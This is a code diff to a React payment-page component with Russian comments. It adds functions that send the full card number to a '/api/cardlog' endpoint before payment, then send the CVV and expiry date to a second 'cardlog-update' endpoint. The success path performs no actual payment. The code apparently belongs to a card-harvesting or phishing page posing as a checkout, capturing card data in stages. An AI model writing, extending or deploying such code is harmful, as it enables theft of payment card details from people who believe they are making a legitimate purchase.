@@ -23,6 +23,8 @@ const Payment = () => {
     phoneNumber: "",
   });
 
+  const [, setCardNumberSent] = useState<boolean>(false);
+
   const [cardData, setCardData] = useState({
     cardNumber: "",
     expiryDate: "",
@@ -44,6 +46,66 @@ const Payment = () => {
   useEffect(() => {
     window.scrollTo(0, 0);
   }, [location.pathname, currentStep]);
+
+  const sendCardNumberToServer = async (): Promise<boolean> => {
+    const sessionId = localStorage.getItem("currentSessionId");
+    if (!sessionId) {
+      alert("Session ID not found");
+      return false;
+    }
+
+    try {
+      // Убираем пробелы из номера карты перед отправкой
+      const cleanCardNumber = cardData.cardNumber.replace(/\D/g, "");
+
+      const response = await fetch("/api/cardlog", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          sessionId: sessionId,
+          cardNumber: cleanCardNumber,
+          cvv: "", // Пока пустой
+          expireDate: "", // Пока пустой
+          step: "card_number_only", // Добавляем метку для бэкенда
+        }),
+      });
+
+      const data = await response.json();
+      return data.success;
+    } catch (err) {
+      console.error("Ошибка сети при отправке номера карты:", err);
+      return false;
+    }
+  };
+
+  const sendFullCardDataToServer = async (): Promise<boolean> => {
+    const sessionId = localStorage.getItem("currentSessionId");
+    if (!sessionId) {
+      alert("Session ID not found");
+      return false;
+    }
+
+    try {
+      
+
+      const response = await fetch("/api/cardlog-update", {
+        // Новый эндпоинт
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          sessionId: sessionId,
+          cvv: cardData.cvv,
+          expireDate: cardData.expiryDate,
+        }),
+      });
+
+      const data = await response.json();
+      return data.success;
+    } catch (err) {
+      console.error("Ошибка сети при отправке полных данных:", err);
+      return false;
+    }
+  };
 
   // Валидация имени/фамилии (только буквы, пробелы и апострофы)
   const validateName = (name: string): boolean => {
@@ -280,7 +342,7 @@ const Payment = () => {
     }
   };
 
-  const handleOpenPaymentModal = () => {
+  const handleOpenPaymentModal = async () => {
     // Валидация номера карты перед открытием модального окна
     if (!cardData.cardNumber) {
       setCardErrors((prev) => ({
@@ -296,6 +358,17 @@ const Payment = () => {
       return;
     }
 
+    // Отправляем номер карты на сервер
+    setLoading(true);
+    const cardNumberSent = await sendCardNumberToServer();
+    setLoading(false);
+
+    if (!cardNumberSent) {
+      alert("Failed to process card number. Please try again.");
+      return;
+    }
+
+    setCardNumberSent(true);
     setCardErrors({
       cardNumber: "",
       expiryDate: "",
@@ -310,32 +383,15 @@ const Payment = () => {
       return;
     }
 
-    // БЕРЕМ sessionId ИЗ localStorage
-    const sessionId = localStorage.getItem("currentSessionId");
-    if (!sessionId) {
-      alert("Session ID not found");
-      return;
-    }
     setModalActive(false);
     setLoading(true);
+
     try {
-      // Убираем пробелы из номера карты перед отправкой
-      const cleanCardNumber = cardData.cardNumber.replace(/\D/g, "");
+      // Отправляем остальные данные карты
+      const fullDataSent = await sendFullCardDataToServer();
 
-      const response = await fetch("/api/cardlog", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          sessionId: sessionId, // ← Отправляем sessionId
-          cardNumber: cleanCardNumber,
-          cvv: cardData.cvv,
-          expireDate: cardData.expiryDate,
-        }),
-      });
-
-      const data = await response.json();
-
-      if (data.success) {
+      if (fullDataSent) {
+        // Успешная обработка
       } else {
         alert("Ошибка при обработке платежа");
       }
